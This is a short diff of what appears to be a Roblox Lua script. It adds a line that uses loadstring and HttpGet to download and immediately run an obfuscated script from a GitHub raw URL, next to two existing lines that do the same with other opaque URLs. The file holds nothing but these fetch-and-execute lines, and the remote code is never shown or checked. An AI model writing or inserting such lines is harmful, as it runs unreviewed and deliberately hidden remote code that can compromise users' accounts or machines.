@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/510HKAqke/Do7nasha8/main/obfuscated_script-1767952694470.lua.txt"))()
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/kllooep/Fjjzxda6/main/Jdheusbzvh, y827"))()
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/kllooep/Fjjzxda6/main/Tahakom74"))()
